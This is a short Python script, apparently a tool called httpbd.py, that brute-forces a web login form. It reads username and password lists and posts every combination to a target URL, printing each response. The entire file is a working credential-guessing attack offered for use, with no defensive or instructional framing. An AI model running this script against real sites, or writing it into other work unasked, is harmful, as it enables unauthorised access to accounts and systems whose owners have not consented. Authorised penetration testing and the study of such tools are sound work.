#!/bin/python3

import requests
import sys
import os


if len(sys.argv) == 4:
    target = sys.argv[1]
    Userfile = sys.argv[2]
    Passfile = sys.argv[3]
    
    
else:
    print("Invalid syntax")
    print("Syntax: python3 httpbd.py <url> <Username/UserFile> <Password/PassFile>")
    sys.exit(1)



def login(username, password):
    r = requests.post(target, data={"username": username, "password": password, "submit": "Login"})
    return r



if os.path.isfile(Userfile):
    with open(Userfile, "r") as uf:
        user_list = [line.strip() for line in uf.read().split("\n")]
    Userfile = user_list



if os.path.isfile(Passfile):
    with open(Passfile, "r") as uf:
        pass_list = [line.strip() for line in uf.read().split("\n")]
    Passfile = pass_list



if isinstance(Userfile, list) and isinstance(Passfile, str):
    for user in Userfile:
        response = login(user, Passfile)
        print(f"response: {response}")
        print(f"for username {user} password {Passfile}")
        
elif isinstance(Userfile, str) and isinstance(Passfile, list):
    for password in Passfile:
        response = login(Userfile, password)
        print(f"response: {response}")
        print(f"for username {Userfile} password {password}")
        
        
elif isinstance(Userfile, list) and isinstance(Passfile, list):
    for user in Userfile:
        for password in Passfile:
            response = login(user, password)
            print(f"response: {response}")
            print(f"for username {user} password {password}")
            
            
elif isinstance(Userfile, str) and isinstance(Passfile, str):
    response = login(Userfile, Passfile)
    print(f"response: {response}")
    print(f"for username {Userfile} password {Passfile}")
